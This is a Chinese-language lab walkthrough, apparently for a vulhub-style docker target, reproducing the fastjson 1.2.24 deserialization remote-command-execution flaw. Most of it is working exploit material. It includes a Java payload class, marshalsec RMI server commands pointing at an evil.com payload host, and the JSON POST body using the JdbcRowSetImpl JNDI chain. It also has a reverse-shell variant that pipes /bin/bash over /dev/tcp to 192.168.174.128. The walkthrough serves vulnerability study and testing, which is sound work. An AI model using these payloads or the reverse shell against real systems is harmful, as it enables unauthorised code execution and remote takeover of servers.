# fastjson 1.2.24 反序列化导致任意命令执行漏洞

## 漏洞环境

运行测试环境：

```plain
docker compose up -d
```

环境运行后，访问http://your-ip:8090即可看到JSON格式的输出。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874344489-b7a3ec05-05ef-4233-bbbb-86a834322237.png)

我们向这个地址POST一个JSON对象，即可更新服务端的信息：

```plain
curl http://your-ip:8090/ -H "Content-Type: application/json" --data '{"name":"hello", "age":20}'
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874344493-f21f4291-7ba9-46f5-bb42-62d1c86f4a76.png)

## 漏洞复现

因为目标环境是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。

首先编译并上传命令执行代码，如http://evil.com/TouchFile.class：

执行javac TouchFile.java，生成TouchFile.class。

```plain
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874344622-e4215ddd-92ba-4294-9eea-5c5ea3006277.png)

安装 Maven：

```plain
sudo apt-get install maven
```

安装 Maven 后，你可以继续构建 marshalsec 项目：

克隆 marshalsec 项目（如果你还没有克隆的话）：

```plain
git clone https://github.com/mbechler/marshalsec.git
cd marshalseccd 
```

构建项目：

```plain
mvn clean package -DskipTests
```

构建成功后，你应该会在 target 目录中看到生成的 marshalsec-0.0.3-SNAPSHOT-all.jar 文件。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874344520-6feb337b-2d0c-4eb9-8646-890fbbca928c.png)

通过python搭建一个临时的web服务，该服务是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件。此处payload文件即TouchFile.class。

```plain
python3 -m http.server 8888
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874344479-727ba3da-76fc-40ba-b7b9-5fa2ad150f0d.png)

然后我们借助[marshalsec](https://github.com/mbechler/marshalsec#tdsub)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class：

```plain
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874345210-4d28f670-01e5-4db0-94bc-85bb2881b2d1.png)

向靶场服务器发送Payload，带上RMI的地址，注意Content-Type应该是application/json：

```plain
POST / HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 160

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/TouchFile",
        "autoCommit":true
    }
}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874345369-508f7d10-1971-4c12-b14e-c913a2b0c62e.png)

可见，命令touch /tmp/success已成功执行：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874345566-2731d27b-9c1f-4bd1-8dc9-3b04c6f4662d.png)

### 反弹shell

同样，执行javac TouchFile.java，生成TouchFile.class。

```plain
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.174.128/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

启动一个RMI服务器，监听8888端口，并制定加载远程类TouchFile.class：

```plain
$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 8888
```

发送POST请求包：

```plain
POST / HTTP/1.1
Host: 192.168.174.128:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 165

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.174.128:8888/TouchFile",
        "autoCommit":true
    }
}
```

监听9999端口，接收反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874345808-5c252ed3-040a-47ae-8666-6ec87976b140.png)